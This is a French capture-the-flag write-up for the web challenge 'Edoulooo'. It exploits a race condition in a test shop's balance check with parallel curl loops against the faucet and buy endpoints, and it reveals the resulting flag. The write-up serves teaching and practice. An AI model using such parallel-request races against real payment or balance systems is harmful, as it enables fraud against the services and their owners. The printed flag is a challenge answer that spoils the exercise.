---
# Imported from Obsidian: Edoulooo – Web Medium (200 pts).md
# Draft: unknown source
title: Edoulooo – Web Medium
category: Web
difficulty: Medium
ctf: Unknown
date: 2026-09-25
summary: 'Page simple : - Solde affiché (départ 100) - Bouton Se créditer (+100) → POST /faucet - Bouton Acheter FLAG → POST /buy (prix 300)'
tags:
- web
lang: fr
draft: true
imported: true
---

**CTF** : ESIG Tech Arena  
**Auteur** : KodjoDoDjango  
**URL** : https://chal-5-edoulooo.ctf.esig.tg/  
**Flag** : `EthACTF{race_to_flash}`

---

## Description

> Une boutique de test vient d'ouvrir. Elle vend un produit très convoité : le FLAG, au prix de 300 EthACTF.  
> Votre portefeuille de départ : 100 EthACTF.  
> Le système de paiement semble rigoureux… mais la logique de débit n'est peut-être pas aussi sûre qu'elle en a l'air.

**Indice** : Race condition.

---

## Reconnaissance

```bash
curl -k https://chal-5-edoulooo.ctf.esig.tg/
```

Page simple :
- Solde affiché (départ 100)
- Bouton **Se créditer (+100)** → `POST /faucet`
- Bouton **Acheter FLAG** → `POST /buy` (prix 300)

Pas de cookie de session visible. L’état semble lié à l’IP (ou un stockage serveur simple).

---

## Analyse de la vulnérabilité

Le check de solde n’est **pas atomique** :

```text
1. Lire le solde
2. Vérifier si solde >= 300
3. Débiter 300
4. Donner le FLAG
```

Si plusieurs requêtes `POST /buy` arrivent en même temps, elles peuvent toutes passer l’étape 2 avant que le solde soit réellement mis à jour.

→ On peut acheter le FLAG même si le solde devient négatif.

---

## Exploitation (Race Condition)

### 1. Créditer le compte

```bash
for i in $(seq 1 50); do
  curl -k -s -X POST https://chal-5-edoulooo.ctf.esig.tg/faucet > /dev/null &
done
wait
```

### 2. Lancer la race sur `/buy`

```bash
for i in $(seq 1 30); do
  curl -k -s -X POST https://chal-5-edoulooo.ctf.esig.tg/buy &
done
wait
```

### Résultat

Plusieurs réponses contiennent :

```
Achat (FLAG) effectué. Nouveau solde : -100. FÉLICITATIONS ! EthACTF{race_to_flash}
```

Le flag apparaît dès que le solde passe en négatif grâce à la race.

---

## Flag

```
EthACTF{race_to_flash}
```

---

## Résumé

| Étape              | Action                          |
|--------------------|---------------------------------|
| Recon              | `/` + `/faucet` + `/buy`        |
| Vulnérabilité      | Race condition sur le débit     |
| Exploitation       | Parallel `POST /buy`            |
| Condition de flag  | Solde négatif après achat       |

**Type de vulnérabilité** : Race Condition (TOCTOU – Time Of Check to Time Of Use)
```
